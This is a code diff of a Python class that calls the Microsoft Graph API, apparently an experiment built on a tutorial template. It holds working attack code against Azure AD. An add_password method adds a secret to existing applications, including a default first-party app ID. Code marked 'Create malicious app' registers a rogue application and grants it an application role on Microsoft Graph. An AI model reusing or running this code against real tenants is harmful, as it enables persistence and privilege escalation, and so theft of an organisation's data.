@@ -84,7 +84,7 @@ class Graph:
 
         endpoint = '/applications'
 
-        search = "displayName:SalesForce"
+        search = "displayName:MS Graph"
         request_url = f'{endpoint}?$search="{search}"'
         print(request_url)
         list_response = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
@@ -106,6 +106,25 @@ class Graph:
         return list_response.json()
 
 # pylint: disable-next=no-self-use
+#      def get_app(self):
+#         # INSERT YOUR CODE HERE
+#         # Note: if using app_client, be sure to call
+#         # ensure_graph_for_app_only_auth before using it
+#         # self.ensure_graph_for_app_only_auth()
+#
+#        # endpoint = '/applications'
+#         endpoint = '/servicePrincipals'
+#         # Only request specific properties
+#         search = 'displayName:Sales'
+#         request_url = f'{endpoint}?$search="{search}"&$count=true ' \
+#
+#
+#         found_app = self.user_client.get(request_url , headers={'ConsistencyLevel': 'eventual'})
+#
+#
+#
+#         return found_app.json()
+
     def get_app(self):
         # INSERT YOUR CODE HERE
         # Note: if using app_client, be sure to call
@@ -115,26 +134,7 @@ class Graph:
        # endpoint = '/applications'
         endpoint = '/servicePrincipals'
         # Only request specific properties
-        search = 'displayName:Sales'
-        request_url = f'{endpoint}?$search="{search}"&$count=true ' \
-
-
-        found_app = self.user_client.get(request_url , headers={'ConsistencyLevel': 'eventual'})
-
-
-
-        return found_app.json()
-
-    def get_app(self):
-        # INSERT YOUR CODE HERE
-        # Note: if using app_client, be sure to call
-        # ensure_graph_for_app_only_auth before using it
-        # self.ensure_graph_for_app_only_auth()
-
-       # endpoint = '/applications'
-        endpoint = '/servicePrincipals'
-        # Only request specific properties
-        search = 'displayName:Windows Azure Active Directory'
+        search = 'displayName:MS Graph Applications'
         request_url = f'{endpoint}?$search="{search}"&$count=true ' \
 
 
@@ -185,29 +185,6 @@ class Graph:
         print(keys)
         return keys.json()
 
-    def add_password(self, token ,id ="460a567d-f226-4836-b929-0a4a83427177"):
-        # salesforce app id from seearch
-
-        #id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
-        # sales force service principal id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
-        # id = "2942ffee-ad11-458b-95a9-242e361aafa4"
-        # id = '53857935-7373-49af-b209-497f13dc8493'
-        request_url = f'/applications/{id}/addPassword'
-
-
-        body = {'displayName': 'my token'}
-
-        print(request_url)
-        print(body)
-        print({'Authorization': f'Bearer {token}'
-                  , 'Content-Type': 'application/json'})
-        added_password = self.user_client.post(request_url,
-                                             data=json.dumps(body),
-                                             headers={'Authorization': f'Bearer {token}'
-                                                 , 'Content-Type': 'application/json'})
-        print(added_password)
-        return added_password.json()
-
     def add_password(self, token, id="00000002-0000-0000-c000-000000000000" ):
         #                             "460a567d-f226-4836-b929-0a4a83427177"):
         # salesforce app id from seearch
@@ -236,7 +213,7 @@ class Graph:
     ####   Create malicious app
     def create_app(self,token):
         request_url = "/applications"
-        body = { "displayName": "Malicious App" }
+        body = { "displayName": "Malicious App graph permissions" }
         print(request_url)
         response = self.user_client.post(request_url,
                                          data=json.dumps(body),
@@ -244,16 +221,16 @@ class Graph:
                                                  , 'Content-Type': 'application/json'})
         return response.json()
 
- ####   Create malicious app
-    def add_app_permissions(self,token ,id = '9b042f49-6aec-4a47-a66d-17b246f7320b'):
+
+    def add_app_permissions(self,token ,id = '6b071e63-f701-454b-9e54-ede4c96483e6'):
         request_url = f'/applications/{id}'
         body = {
                           "requiredResourceAccess": [
                     {
-                        "resourceAppId": "00000002-0000-0000-c000-000000000000",
+                        "resourceAppId": "00000003-0000-0000-c000-000000000000",
                         "resourceAccess": [
                             {
-                                "id": "75359482-378d-4052-8f01-80520e7db3cd",
+                                "id": "810c84a8-4a9e-49e6-bf7d-12d183f40d01",
                                 "type": "Role"
                             }
                         ]
